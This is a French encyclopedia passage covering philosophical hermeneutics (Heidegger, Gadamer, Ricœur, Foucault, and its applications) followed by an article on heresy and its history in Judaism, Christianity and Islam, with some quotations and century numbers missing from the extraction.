Wilhelm Dilthey (1833 – 1911) voit dans l'herméneutique la possibilité d'une fondation pour les sciences humaines. Les sciences de la nature ne cherchent qu'à « expliquer » ("Erklären") leur objet, tandis que les sciences de l'homme, et l'histoire en particulier, demandent également à « comprendre » ("Verstehen") de l'intérieur et donc à prendre en considération le vécu.
Néo-évangélisme.
Dans le courant néo-évangélique, la théologie évangélique modérée a fait son apparition dans les années 1940 aux États-Unis. L’étude de la Bible est accompagnée de certaines disciplines comme l’herméneutique et l’exégèse biblique. Des théologiens modérés sont devenus davantage présents dans les instituts de théologie évangélique et des prises de positions théologiques plus modérées ont été adoptées dans les églises évangéliques.
Naissance de l'herméneutique philosophique.
L'herméneutique philosophique contemporaine se conçoit comme une théorie de l'interprétation, et de la réception de l'œuvre (littéraire ou artistique). Elle questionne la textualité en elle-même, et son rapport à l'auteur (processus d'explication) et au lecteur (processus de compréhension).
L'herméneutique philosophique cherche à analyser ce qui se manifeste, ce qui se présente de soi dans l'œuvre d'art (perspective phénoménologique). Elle pose donc de manière originale le problème de la représentation et de la phénoménalisation, s'inspirant en cela des travaux novateurs de Husserl (lequel avait livré une théorie très élaborée de l'imagination, notamment dans les "Ideen I", à défaut d'esthétique à proprement parler).
Le langage de l'art représente pour les herméneutes le lieu où la vérité de l'Être se déploie, au-delà de la description scientifique des étants particuliers. L'herméneutique se fonde ainsi sur une nouvelle interrogation du verbe « être », à la fois grammaticale, ontologique et esthétique, à partir des importants travaux de Martin Heidegger dans "Être et Temps" (et dans ses œuvres ultérieures, dont la tentation hermétiste sera critiquée).
L'herméneutique philosophique utilise comme paradigme majeur la poésie, notamment la poésie romantique, symboliste, surréaliste ou d'inspiration hermétiste, c'est-à-dire la poésie qui ne se comprend pas à la première lecture, mais qui nécessite un effort pour être décryptée. Les philosophes herméneutes analysent par exemple les textes et l'esprit de Hölderlin, Mallarmé, Valéry, Rilke, Artaud ou encore Ponge.
Le deuxième grand paradigme de l'herméneutique est le roman, notamment les œuvres subversives qui remettent en cause les normes traditionnelles d'écriture. Ainsi, on croisera sous la plume des grands herméneutes Rabelais, le Marquis de Sade, Joyce, Kafka, Bataille, ou encore d'autres grands écrivains comme Goethe ou Borges.
Heidegger.
Martin Heidegger étend la conception de Dilthey et conçoit à un certain moment l'herméneutique comme la tâche même de la philosophie si l'existence – objet de la philosophie – demande à être interprétée et si elle n'est autre qu'un processus d'interprétation, une compréhension de soi. L'herméneutique est en ce sens un dépassement de la phénoménologie car elle s'applique à ce qui ne se montre pas, à détruire plutôt un rapport de conscience qui dissimule un rapport authentique à l'être. L'herméneutique constitue ainsi l'ontologie.
Gadamer.
L'élève de Heidegger, Hans-Georg Gadamer publia en 1960 l'ouvrage qui passe encore pour son livre le plus important : "Vérité et Méthode".
Cette œuvre affirme, en contestation de la fausse objectivité souvent présente dans les sciences humaines, que « la méthode ne suffit pas ». Une œuvre ne peut pas être expliquée uniquement selon notre propre horizon d'attente. La lecture est faite dans la tension existant entre le texte du passé et l'horizon d'attente actuel.
De plus, Gadamer affirme que « tout texte est réponse à une question. » Si le texte parle encore aux lecteurs présents, c'est qu'il répond encore à une question. Le travail de l'historien est de trouver à quelle question le texte répondait dans le passé et à laquelle il répond aujourd'hui.
Ricœur.
Paul Ricœur entreprend une herméneutique du soi, herméneutique dans la mesure où le moi ne se connaît pas par simple introspection, mais par un ensemble de symboles. Il s'agit de déchiffrer le sens caché dans le sens apparent.
Pour Ricoeur, la psychanalyse est une forme d'herméneutique (interprétation des symptômes du malade).
Jauss.
Hans Robert Jauss, appartenant à l'École de Constance, dans "Pour une esthétique de la réception" (1972), reprenant les enseignements de Gadamer, affinera la théorie herméneutique. Il proposera l'usage d'une « triade » herméneutique pour l'étude des œuvres.
La triade herméneutique de Jauss :
L'herméneute qui utilise ce modèle s'implique donc énormément dans l'étude et tente de comprendre la valeur novatrice de l'œuvre.
Foucault.
En 1982, Michel Foucault intitule son cours au Collège de France : « herméneutique du sujet ». Il est question en réalité d’une « herméneutique de soi » au sens d’une forme de connaissance de soi. La notion fondamentale est la pensée grecque de l"'epimeleia heautou" (le souci de soi). Cette question est en même temps esthétique : une « esthétique de l’existence » entendue comme une éthique, soit la production de normes qui ne soient pas cryptées, mais que le sujet fonde ou découvre, et par lesquelles il se découvre également.
Foucault considère que la « généalogie » nietzschéenne, qui interprète les jugements de valeur (vrai/faux, bien/mal, beau/laid) à partir de l'histoire et de la physiologie (état de santé du corps), est une herméneutique.
Applications de l'herméneutique.
Traductologie.
L'herméneutique est en traductologie une approche de la traduction à part entière ayant comme figure de proue le linguiste allemand Friedrich Schleiermacher (1767-1834). Schleiermacher conçoit l’herméneutique traductionnelle comme un acte d'immersion du traducteur dans la psyché de l'auteur. Il s'agit d'une méthode de traduction empathique, qui insiste sur l'importance de ressentir le texte à traduire. Prétendant proposer une alternative à l'approche linguistique de la discipline, l'approche herméneutique décompose l'acte de traduction en quatre stades et non trois : "un élan de confiance", "l'incursion, l'agression, l'extraction", "l'incorporation au sens fort du terme" et "une réciprocité qui recréée l'équilibre".
Sociologie.
La sociologie herméneutique consiste en la recherche de la compréhension des phénomènes dans leur singularité. Elle est l'art de retranscrire un discours afin d'en extraire les besoins des individus, une sorte de traduction des discours.
Anthropologie.
Pour l'anthropologie interprétative, découlant de l'herméneutique, les faits étudiés sont le produit des réflexions des personnes qui leur sont rattachées. Pour Gagnon, l'anthropologue adoptant une approche herméneutique cherche alors « les connaissances, les représentations, les règles et les attentes que la culture met à la disposition des individus pour leur permettre de donner sens à leurs actions, pour décrire et expliquer le monde (dimension sémantique) mais aussi pour agir, produire quelque chose, résoudre un problème (dimension pragmatique)». Pour être valides socialement, les significations doivent être partagées, à la manière d'un texte public, et la société les garde pour les retransmettre de génération en génération en les adaptant plus ou moins au contexte. Le rôle de l'anthropologue est alors de lire la culture et de l'interpréter à la manière de ce qu'une lectrice ou un lecteur ferait, notamment en rendant clair ce qui est sous-entendu ou présupposé, comme ce que propose Taylor puisque les discours et dialogues contiennent une certaine quantité d'informations tenues pour acquises. Cette méthodologie n'est toutefois pas neutre. Gagnon souligne quelques limites, comme le fait que l'anthropologue est en soi interprète et doit tenir compte de ses propres préjugés culturels et de ses préconceptions issus de sa culture d'origine.
Informatique.
Les chercheurs en informatique, particulièrement ceux qui traitent de linguistique informatique, d'ingénierie des connaissances, d'intelligence économique, et de protocoles d'analyse, n'ont pas manqué de remarquer la communauté d'intérêt qu'ils partagent avec les chercheurs en herméneutique, par rapport au caractère des agents d'interprétation et à la conduite des activités d'interprétation. Par exemple, dans leur résumé de mémoire en intelligence artificielle en 1986, Mallery, Hurwitz, et Duffy ont déclaré ce qui suit :
Relations internationales.
L'herméneutique en relations internationales a connu un regain d'attention avec la fin de la guerre froide. Ceci s'explique par la multiplicité des théories déployées et leur incapacité, par la pensée rationnelle, à expliquer dans leur globalité les rapports internationaux. Dans un esprit de synthèse, certains auteurs redécouvrent la pensée de Gadamer, tel Richard Rorty, pour l'appliquer à la philosophie politique.
Cette philosophie « se débarrasse de la théorie classique de l'homme-connaisseur-des-essences », c'est-à-dire de la vérité par correspondance et met l'accent sur le contexte spatio-temporel de toute théorie et sur l'intentionnalité des auteurs. L'acte de comprendre se décompose alors en trois étapes qui forment le cercle herméneutique : la compréhension stricto sensu, l'interprétation et l'application (confrontation avec le réel par cohérence). Cette dernière étape participe à la notion de réflexivité en science sociale.
Rorty insiste sur le holisme du cercle herméneutique qui fait que tout penseur doit envisager un système dans sa totalité pour en comprendre les parties, et inversement, comprendre toutes les parties pour saisir le fonctionnement du Tout.
Appliqué aux relations internationales, la constructiviste Martha Finnemore voit dans l'herméneutique une invitation à la confrontation paradigmatique, pour approcher au plus près la réalité. De plus, la vérité étant nécessairement établie par cohérence, il y aura toujours un décalage entre l'environnement représenté des acteurs et l'environnement réel. Question qui renvoie à la théorie de Robert Jervis sur les fausses perceptions. Enfin, la compréhension du monde, compris comme un complexe "Tout-unités", amène nécessairement à concilier holisme et individualisme méthodologique.
Religion et théologie.
Mircea Eliade, comme un historien des religions et un herméneute, comprend la religion comme « l'expérience du sacré », et interprète le sacré par rapport au profane. Le savant roumain souligne que la relation entre le sacré et le profane n'est pas d'opposition, mais de complémentarité, ayant interprété le profane comme une hiérophanie. L'herméneutique du mythe est une partie de l'herméneutique de la religion. Le mythe ne doit pas être interprété comme une illusion ou un mensonge, parce qu'il y a une vérité dans le mythe à redécouvrir. Le mythe est interprété par Mircea Eliade comme « une histoire sacrée ». Il a introduit le concept de « l’herméneutique totale ».
: résurrection des quatre sens.
En matière d'herméneutique biblique, et à la suite des travaux du cardinal Henri de Lubac, s.j., sur l'exégèse médiévale, la théorie des quatre sens de l'Écriture semble renaître chez les théologiens contemporains. Le cardinal Urs von Balthasar écrivait à ce sujet en 1970 :

</doc>
<doc id="1477" url="https://fr.wikipedia.org/wiki?curid=1477" title="Hérésie">
Hérésie

Une hérésie est une doctrine contraire aux croyances d'une religion établie. Dans l’Antiquité, le terme haíresis (en grec ancien : , « choix ») désignait une école de pensée philosophique librement choisie. Dans l'histoire du christianisme, le concept se définit "a contrario" en se chargeant d'une signification péjorative : le terme « hérésie » désigne les doctrines qui remettent en cause les dogmes de l'Église catholique, de sorte que l'« hérésie », souvent synonyme d'« hétérodoxie » (de ἑτεροδοξία, "hétérodoxia"), s'oppose à ce qui est jugé « orthodoxe ». 
Cette connotation négative apparaît entre les et siècles et se fait condamnation de tous dogmes contraires aux opinions et pratiques catholiques au Moyen Âge. L'hérésiologie devient un champ d'étude et un genre littéraire. Dans le langage courant, le mot « hérésie » en vient à désigner une opinion qui heurte les usages et ce qui est admis ou tenu pour acquis dans les domaines de la pensée, de la connaissance, de la religion. Ainsi, Hilaire Belloc a pu proposer une définition qui englobe sa dimension religieuse et scientifique et s'étend à son usage séculier : .
L'hérésie est distincte du schisme, qui est un rejet de l'autorité ecclésiale, de l'apostasie, qui est le reniement de sa propre foi, et du blasphème, qui est une parole ou un acte insultant envers Dieu. L'hérésie se produit à l'intérieur de la foi, de manière réfléchie et persistante, se présentant soit comme une innovation soit comme un retour à une prétendue pureté originelle de la Révélation.
En dehors de l'Église catholique, la notion d'hérésie est utilisée dans les Églises orthodoxes ou protestantes, ainsi qu'en référence au judaïsme ou à l'islam.
Définition.
Étymologie et sémantique.
Le mot « hérésie » est emprunté au grec , , qui signifie à l’époque classique « choix », puis à l’époque de la koinè, « préférence pour une doctrine, école philosophique », « obédience philosophique » dont le pendant latin est "secta" ou "disciplina". Ainsi, le « jardin » d’Épicure était une "haíresis".
Le mot finit par désigner une « secte religieuse » ou une « dissidence » dans le christianisme primitif. Dans le monde antique, où la religion est plus rituelle que dogmatique, l’"haíresis" n’a pas l’aspect dramatique qu'elle devait revêtir dans le christianisme. En effet, l’Antiquité polythéiste sépare le mythe de la philosophie. Le monothéisme en revanche introduit la théologie, étude scolastique du divin qui englobe et transcende tous les domaines du savoir, soumet la philosophie et édicte des « vérités révélées » sur Dieu : les dogmes.
La théologie classique n'oublie pas le sens premier du terme mais y intègre au le schisme, la désobéissance aux décrétales du pape (Henri de Suse) et Martin V l'usure.
À partir du , tout en gardant son caractère de stigmatisation ecclésiale, le terme se charge de sens nouveau pour désigner une tromperie, une ruse, une duplicité parfois sans lien avec le champ religieux. Il désigne également, à la même période, un crime révoltant. Spécifiquement, il pouvait désigner une action criminelle telle que la cohabitation des sexes contraire aux lois de l'Église, ou bien la sorcellerie.
Hérésie et dogme.
Les dogmes ne revêtent pas la même importance dans toutes les religions, ce qui explique différentes attitudes par rapport à ce qui est qualifié d'hérésie. Certains auteurs estiment que la notion est trop intimement liée au contexte historique et religieux des premiers siècles du christianisme qui l'ont produites pour être transposée utilement à l'étude des dissidences et hétérodoxies des autres monothéismes. Depuis les grands conciles œcuméniques des , l'Église aurait "fabriqué l'hérésie" afin de mieux asseoir son autorité, imposer son image de corps unique, enseigner une voie unique de salut et réussir ainsi à façonner le pouvoir et la société.
À la différence du christianisme, judaïsme et islam ne possèdent pas d'instrument de coercition centralisé ni de magistère dogmatique unique et identifié.
Judaïsme.
La littérature talmudique ne possède pas de notions similaires et de termes pour désigner les hétérodoxies comparables aux hérésies telles qu'elles ont été décrites dans le monde chrétien. Le judaïsme, n'ayant jamais connu d'orthodoxie au sens strict, les déviances aux normes rabbiniques ou aux treize principes de foi de Maïmonide ne sont pas équivalentes à des hérésies. Toutefois, après la destruction du Temple (70), le mouvement pharisien/tannaïte se donne peu à peu comme exclusif et majoritaire. Dans la littérature rabbinique, ses opposants sont alors désignés par divers termes techniques et notamment par celui de "min" et . Le terme minim désigne à différentes périodes de l'ère rabbinique les divers groupes qui, tout en demeurant partie intégrante du judaïsme du point de vue de la halakha, soulèvent des questions doctrinales pour le judaïsme rabbinique. Il ressort d'un certain nombre de restrictions édictées par les tannaim à l'encontre des minimes qu'elles visent dans un premier temps les judéo-chrétiens. Ces règlements montrent comment les rabbins ont tenté de combattre des doctrines qu'ils estimaient extérieures au judaïsme sans jamais rejeter la judéité de ceux qui les faisaient siennes. Cependant, comme le remarque Adiel Schremer, dans l'Antiquité, l'identité juive est bien une question de naissance et de fidélité à l'alliance mosaïque qu'un examen des doctrines et des pratiques.
Christianisme.
Les différentes autorités chrétiennes qui ont élaboré la norme religieuse ont conceptualisé l'hérésie. Cependant elle s'impose de l'Antiquité à l'époque moderne comme un concept extrêmement versatile et ambivalent. Dans le Nouveau Testament, les formes "hairesos" ou "hairéseis" sont utilisées soit pour désigner le christianisme naissant comme « secte » ou « école juive » soit pour mettre en garde contre une dissension. Au , ils demeurent des proches synonymes de "schisma" qui indique l'idée d'une scission, du risque d'un schisme. Lors de la période patristique et surtout à la faveur du règne de Constantin, les termes "haeresis" et "haereticus" deviennent sans conteste la condamnation de doctrines erronées et de leurs partisans, permettant de stigmatiser une opinion hétérodoxe qui éloigne de la foi canonique. À la fin du et après les grands conciles le terme devient équivalent d'hétérodoxie. Discours d'exclusion des dissidences, la réflexion sur l'hérésie est aussi l'occasion pour l'Église de définir des lignes de conduites et d'affirmer son unité.
À partir du , l'extension progressive du domaine de l'hérésie à de nombreuses formes d'activités répréhensibles comme l'usure, la sorcellerie ou la rébellion politique a fini par lui conférer le statut de crime globalisant.
Cependant, comme l'a montré Walter Bauer, les premières manifestations du christianisme correspondent à ce qui est qualifié d'hérétique à partir du deuxième siècle. Historiquement, l'hérésie est donc antérieure à l'orthodoxie.
Le christianisme s'illustre en de multiples théologies et pratiques hétérodoxes, que ce soit dans le domaine christologique (docétisme, arianisme, nestorianisme, monophysisme), cosmologique (gnose, macédonianisme, manichéisme, et plus tard bogomilisme, catharisme), ecclésial (marcionisme, montanisme, donatisme) ou disciplinaire (quiétisme).
Herbert Grundmann, parmi d'autres, distingue les hérésies populaires, qui ont parfois donné naissance à une Église dissidente (cathares), et les hérésies savantes, fondées sur les recherches théologiques, philosophiques ou scientifiques plus isolées (Pierre Abélard), non sans que des ponts puissent exister entre elles (Jan Hus).
Premier millénaire.
Le terme « hérésie » a pris une valeur péjorative et s'affirme avec force dans les controverses théologiques où s'illustrent Justin de Naplouse et Irénée de Lyon qui ont écrit dès le . Ces apologistes, comme Méliton de Sardesou Justin développent l'idée d'un appel au pouvoir pour défendre la vraie foi contre l'hérésie. Ils sont suivis au par Hippolyte de Rome, sans lequel certaines hérésies seraient restées inconnues, mais dont l'ouvrage est ambigu, car celle qu'il réfute le plus violemment est celle de , représentant de ce que l'on devait appeler plus tard la Grande Église. Au , les empereurs romains prennent des mesures contre les hétérodoxes ou hérétiques, afin de limiter les querelles entre chrétiens. .
Avec l'institutionnalisation de l'Église autour de l'empereur, pour répondre aux hérésies qui menacent la nouvelle autorité ecclésiastique, la pratique juive des assemblées est reprise par l'Église primitive, qui la transforme en conciles œcuméniques, c'est-à-dire en réunions de l’ensemble des évêques qui permettent de débattre des questions controversées. Le premier concile de Nicée sous l'égide de l'empereur romain Constantin le Grand et sur les recommandations d'un synode dirigé par l'évêque Ossius de Cordoue à la Pâques de 325 réunit les évêques de toutes les provinces à Nicée. Ce synode est chargé d'enquêter sur les troubles provoqués par la controverse arienne. Il produit une profession de foi, le symbole de Nicée, qui veut clarifier la nature du Christ et désavoue la gnose et voue l'arianisme à l'anathème. Pour la plupart des évêques, les enseignements d'Arius étaient hérétiques et dangereux pour le salut des âmes. Selon Warren Carroll, .
Ce symbole est complété en 381, lors du premier concile de Constantinople convoqué par , empereur de l'Empire romain d'Orient, par une précision sur la nature du Saint-Esprit qui rejette le pneumatomachisme. Un décret exige de tous les sujets de Constantinople qu'ils souscrivent à la croyance en la Trinité du Père, du Fils et du Saint-Esprit. Cet édit définit l'orthodoxie chrétienne et met fin à un grand et vif débat sur la nature de Dieu ; toutes les autres conceptions sont désormais déclarées hérétiques (« "haeretici dogmatis" »). Si ces conciles ont un rôle de normalisation de la foi chrétienne, ils changent aussi le visage de la chrétienté en légitimant la centralisation du pouvoir ecclésiastique organisé par le pouvoir impérial. Quiconque professe une théologie hérétique pèche contre l’unité de l’Église et devient passible d’anathème ou d'excommunication. Dans la pratique, la lutte contre les hérésies revêt plusieurs formes, rarement violentes, du moins au début. Les plus communes sont la catéchèse, la prédication notamment au cours des messes, et souvent l'argumentation et la « disputation ».
L'hérésiologie trouve sa synthèse au début du chez Épiphane de Salamine et son généalogique "Panarion", « remèdes contre le poison de l’hérésie » et chez Théodoret de Cyr, plus dogmatique, et son "Histoire des hérésies" ("Haereticarum fabularum compendium").
Sous la dynastie théodosienne, l'hérésie est combattue au nom d'une orthodoxie impériale qui revendique l'autorité et veut maintenir le consensus religieux. Elle se définit et est condamnée dans un corpus juridique et théorique qui l'affilie au crime ("scelus") et au sacrilège ("sacrilegium"). C'est sur cette tradition que s'appuie le pouvoir carolingien pour condamner et réprimer les dissidences religieuses qui sont pour les pouvoirs publics autant de crime de lèse-majesté.
Avec le pélagianisme, théorisé par Julien d'Éclane et dénoncé dès le début du par Augustin d'Hippone, l'Occident connaît sa première doctrine jugée comme hérétique par les grands conciles œcuméniques, doctrine qui devait connaître une grande fortune tout au long du Moyen Âge. Cependant, au Haut Moyen Âge, exception faite du mouvement adoptianiste de la péninsule ibérique contrôlée par les Omeyyades et d'un Élipand de Tolède, de l'hérésie félicienne de Félix d'Urgell et du saxon Gottschalk d'Orbais, partisan d'une prédestination totale, les hérétiques identifiés et reconnus comme tels sont très rares dans les sources.
De l'an mil au.
En Occident, les sont une période de vigilance accrue à l'égard de l'hérésie, marquée par des combats plus violents, plus centralisés et par prolifération de traités antihérétiques. Dans « une société persécutrice », selon la formule de l'historien Robert Moore, l'erreur doctrinale est de plus en plus criminalisée et taxée d'hérésie.
La réforme grégorienne, en mettant l'accent sur la supériorité du spirituel par rapport au temporel, suscite dans de nombreuses régions un anticléricalisme virulent qui favorise la recrudescence des hérésies, les laïcs étant notamment sensibles aux discours dénonçant l'enrichissement du clergé à leur détriment, l'indignité morale des clercs ou l'insuffisance de leur zèle pastoral. Ainsi, les adversaires désignés comme hérétiques étaient le plus souvent animés par le désir de réformer en profondeur l'institution ecclésiastique, de la ramener à ses valeurs premières, au premier rang desquelles la pauvreté, en vue du salut. C'est ainsi le cas des mouvements vaudois ou dolcinien. Après le , les mouvements religieux prônant la pauvreté volontaire devaient systématiquement être condamnés pour hérésie, étant perçus comme une menace à l'ordre social.
Au , les dissidences religieuses sont empreintes d'un refus de la matérialité (procréation, Incarnation, nourriture carnée), de l'inégalité matérielle et de pratique considérées comme idolâtres. Elles témoignent d'une même anxiété et d'une quête de pureté matérielle et ecclésiale face aux troubles du temps, aux transformations de la société médiévale et à l'affirmation, parfois brutale, de la féodalité.
Au-delà, les hérétiques sont ceux qui prétendent pouvoir parvenir à la connaissance de la vérité religieuse de leur propre chef sans une soumission fidèle aux enseignements de l'Écriture ou de l'autorité ecclésiale. Cependant l'Église les qualifie d'hérétiques, en référence à la littérature hérésiologique des premiers siècles, qui visait des systèmes d'un tout autre ordre. Ainsi l'hérésie d'Orléans en 1022 implique l'élite cléricale orléanaise. Ils sont brûlés comme hérétiques sur ordre de Robert le Pieux, ce qui en fait le premier bûcher de la chrétienté médiévale. Tant par la sévérité du châtiment que par la qualité intellectuelle des accusés, l'affaire d'Orléans, procès d'une « hérésie savante », est un cas singulier au sein du « printemps des hérésies » que semble constituer le .
Du milieu du jusqu'à la deuxième décennie du , période marquée par un grand nombre de réformes d'inspiration apostolique, on ne compte que peu de manifestations proprement hérétiques en Occident, ce qui a conduit à penser à un véritable « vide » hérétique. C'est à la faveur de ces réformes multiples que naît le mouvement de la Pataria au sein du clergé milanais avant de s'étendre au petit peuple urbain italien puis français et néerlandais. Ce mouvement diffus qui refuse les sacrements délivrés par des clercs corrompus ou indignes, glisse progressivement vers l'hérésie avant de s'affirmer comme une hétérodoxie majeure avec Pierre de Bruys, Henri de Lausanne et Arnaud de Brescia. Ces contestations du clergé s'accompagnent souvent d'une remise en cause ecclésiologique, d'une négation de certains sacrements, à commencer par le baptême des enfants et d'une affirmation de la seule autorité de l'Evangile. Chez Brescia, la condamnation des possessions terrestres du clergé devait marquer par son évangélisme radical les mouvements des Pauvres lombards et des Pauvres de Lyon. Dès le milieu du , Bonn et Cologne, puis Liège sont les foyers d'un mouvement hérétique radical, connu dans l'historiographie sous le nom d'hérétiques rhénans, qui reprennent les thèmes du siècle en prônant pauvreté volontaire, refus des biens matériels, mépris des sacrements et de la hiérarchie ecclésiale. Dans le même temps, les sources font état de constitution d'hétérodoxies dualistes ou néomanichéennes, plus structurées, du Milanais jusqu'au Languedoc, qui devaient donner naissance au mouvement albigeois. Durant le dernier quart du siècle, c'est l'hérésie développée par Pierre Valdès à Lyon qui inquiète très sérieusement la curie romaine. En 1184, le pape réunit conjointement avec l'empereur un concile qui condamne les hérésies nouvelles - - et toutes formes de prédications n'ayant pas été reconnues par l'autorité romaine. Une inquisition d'une grande rigueur mais circonscrite à la législation des évêques et confiée au bras séculier est instituée par la bulle "Ad abolendam". C'est dans le Languedoc que la papauté, en la personne d', décide d'organiser une intervention militaire d'ampleur contre l'hérésie en 1209.
La lutte contre l'hérésie aux.
Dès 1199, la papauté développe un nouvel arsenal juridique pour lutter contre les hérésies. Dans sa bulle pontificale , assimile l’ à un crime de lèse-majesté, concept romain redécouvert à cette époque par les autorités laïques. En 1205, condamne ceux qui viennent au secours des hérétiques, leur interdisant de fait l'assistance d’un avocat, voire de témoins à décharge. La procédure inquisitoriale, destinée à la répression de tous les crimes et non des seules hérésies, est complétée et codifiée par une série de décrétales dont (1199) et (1206). Toutes les dispositions relatives à la procédure inquisitoriale seront reprises et mises en ordre en novembre 1215 à l’occasion du concile du Latran, au , lui aussi nommé .
 cherche à mieux contrôler le clergé, de manière à mettre fin aux critiques adressées à certains de ses membres. Il s’appuie sur les cisterciens pour lutter contre l’hérésie cathare. Il désigne parmi eux ses légats avec pleine autorité sur les évêques en la matière. Leur action est plutôt inefficace. En 1208, le meurtre de l’un d’entre eux, Pierre de Castelnau, permet au pape de lancer la croisade contre les albigeois, à laquelle il avait appelé à plusieurs reprises depuis 1204. Il est ainsi à l’origine d’une guerre particulièrement violente contre les anticléricaux et évangélistes du Midi de l’actuelle France, déclarés hérétiques.
En 1231, les peines pour hérésie sont définies par le pape dans sa constitution et l'Inquisition y est instituée et généralisée. Cette institution ecclésiastique d'exception et permanente, munie de pouvoirs d'enquête et de jugement, soustrait les laïques à la justice séculière pour les causes d’hérésie. Elle est confiée aux ordres mendiants dominicains mais aussi franciscains. Dès lors, les prétendus hérétiques peuvent devenir les cibles d'une persécution judiciaire, si une autorité religieuse ou séculière, sur dénonciation des « mauvais bruits » reportés par un juge supérieur, sont dignes de constituer une procédure de mise en accusation à l'encontre d'un individu ou d'un groupe.
Aux , après instruction de l’enquête, si le cas d’hérésie est avéré, le juge rappelle le dogme et demande solennellement à l’accusé d’y adhérer par une profession de foi. Si l’accusé accepte de se rétracter, il est condamné à une simple pénitence, sous forme d’actes de dévotion et de charité ou d’un pèlerinage, sauf s’il s'est rendu coupable de conversions à sa doctrine ; dans ce cas, il encourt l’« emmurement », c'est-à-dire la prison, peine exécutée par les autorités séculières. En cas de refus, il est excommunié et donc voué à la damnation éternelle. Le bûcher ne vaut qu’en cas de relaps, c'est-à-dire si l'accusé s’est rétracté au cours d’un jugement précédent mais recommence à professer sa doctrine.
L'accusation d'hérésie peut à l'occasion être instrumentalisée par les pouvoirs laïcs, comme c'est manifestement le cas lors du procès des Templiers organisé par dans son conflit avec la papauté dans les premières années du .
Au début du , toute la chrétienté est ébranlée par un profond débat sur la pauvreté de l'Église. Suscité par la querelle des spirituels chez les franciscains, il provoque un déchirement en leur sein même, l'ordre des Frères mineurs se divisant entre conventuels et spirituels. Le conflit s'accentue après 1274 lors de la reconnaissance de l'ordre, face à l'hostilité de la papauté envers les spirituels et leur pratique intransigeante de la pauvreté évangélique et leur refus de toute forme de propriété. Du courant des spirituels émerge le mouvement dissident des Fraticelles très influencés par le millénarisme de Joachim de Flore et susceptibles de contester l'autorité d'une hiérarchie accusée d'être indigne de l'idéal évangélique. Ils sont poursuivis et déclarés hérétiques dès 1311 par la bulle "Cum inter nonnullos" qui rejette comme hérétiques les thèses affirmant que le Christ et ses apôtres n'ont jamais rien possédé, ni en propre ni en commun. Les bulles du et du , confirment leur excommunication. Benoît XII renouvèle la condamnation des Fraticelles en 1336. Désormais persécutés, ils se maintiennent cependant à Naples, en Sicile et en Arménie jusqu'au dernier quart du .
Tout au long du , les autorités politiques et religieuses sont conscientes de la vigueur des hérésies anciennes et nouvelles nées d'une forte intériorité du sentiment religieux. Ainsi dans le monde anglais la persistance d'un lollardisme tardif et l'émergence du wycliffisme impose une répression suivie et systématique.
Les hérésies à l'époque moderne.
Au , avec le déploiement d'une l'Inquisition d'État en Espagne et à Rome, l'essor de la Réforme et le succès du principe « "cujus regio, ejus religio" », les dynamiques de la dissidence sont considérablement modifiées.
Dans le royaume de France, la répression de l'hérésie devient pour bonne part l'affaire du pouvoir temporel, qui s'y exerce avec une ardeur gallicane. L'édit de Compiègne (1557) est sans appel pour la plupart des manifestations d'hérésie, passibles de peine de mort et même d'exécutions sommaires.
Époque contemporaine.
Le décret "Unitatis Redintegratio" du concile Vatican II sur l'œcuménisme opère un changement de forme important. Les termes ou ne doivent plus être utilisés, au profit de . L'Église reconnaît que les fautes responsables des scissions au cours de l'histoire ont pu être commises par des catholiques. Elle considère que le mouvement œcuménique est inspiré par l'Esprit saint.
En 1992, le "Catéchisme de l'Église catholique" définit l'hérésie comme « la négation obstinée, après la réception du baptême, d’une vérité qui doit être crue de foi divine et catholique, ou le doute obstiné sur cette vérité ».
En 1995, l'encyclique "Ut unum sint" de , première encyclique sur l'engagement œcuménique, confirme le changement opéré par le concile Vatican II et précise :
Islam.
Contrairement au christianisme, l'islam n'a jamais eu une seule autorité d'enseignement dogmatique servant de référence à la majorité des croyants. Les concepts d'orthodoxie, d'hétérodoxie et d'hérésie, qui sont apparus dans le monde chrétien, ne s'appliquent que partiellement et de manière très relative à l'Islam. Il existe une doctrine que l'on peut qualifier de majoritaire, le sunnisme, qui prétend être la " conception correcte " en matière de religion et qui condamne les autres doctrines comme étant infidèles ("kufr"), déviantes ("zandaqa") ou novatrices ("bidʻah"). Cependant, les différentes tendances minoritaires n'ont pas toutes été assimilées ou rejetées et ont pu définir leur propre personnalité.
Le mot arabe proche de la notion d'hérésie est "bidâa", c'est-à-dire « innovation ». Un hadith jugé authentique met en garde les musulmans contre toute forme d'« innovation ». Toutefois, cette notion diffère selon les écoles, mais de façon générale, la signification de "bidâa" tend vers le superflu, vers ce qui n'existait pas au temps du Prophète.
Le Coran étant la première source de la jurisprudence islamique, il est commun de trouver plusieurs interprétations d'un même texte à partir des clarifications tirées de la parole et de la tradition du Prophète. L'islam est donc riche en courants divergents (sunnites, chiites, ibadites, druzes…), dont chacun peut être considéré comme hérétique ou véridique par d'autres. Ces courants ont été à l'origine de nombreuses entités étatiques prolongeant les conflits théologiques par des conflits politico-militaires (Almoravides et Almohades, Proche et Moyen-Orient moderne).
Le penseur indien Ali Asghar Engineer écrit dans son livre "À propos de la méthodologie d'interprétation du Coran" :
Asghar Ali Engineer plaide pour que chaque génération se voie reconnu le droit d'interpréter le Coran avec son propre éclairage, à la lumière de ses propres expériences.
Kufr.
La charte nommée « Constitution de Médine » définit le "kufr" ou « récalcitrant », qui est exclu des garanties de sécurité et d'assistance prévues par ce texte. Entre autres, il ne peut exercer la vengeance selon la loi du Talion.
 La raison invoquée est que le "kâfir" ne se fie ni à Dieu, ni à Mahomet.
La charte indique également une exception :
Toutefois, le document ne désigne jamais ces Juifs alliés de leur nom propre de tribu, mais seulement par leur relation aux tribus affidées et manifeste une vigilance méticuleuse à leur égard. Au , les Juifs de Yathrib faisaient l'objet de discussions et polémiques plutôt que d'un accord tranquille.
Zandaqa.
Le terme arabe "zindīq" est un mot emprunté du moyen-persan "zandik 𐭦𐭭𐭣𐭩𐭪", un terme zoroastrien d'étymologie et de signification incertaines ().
Zindīq (زنديق) ou Zandik (𐭦𐭭𐭣𐭩𐭪) était initialement utilisé pour désigner péjorativement les adeptes de la religion manichéiste dans l'Empire sassanide, alors de religion zoroastrienne. Cependant, au sous les Abbassides, la signification du mot "zindīq" et de l'adjectival "zandaqa" s'était élargie et pouvait dénoter de nombreuses choses: les dualistes gnostiques ainsi que les adeptes du manichéisme, des agnostiques et des athées.
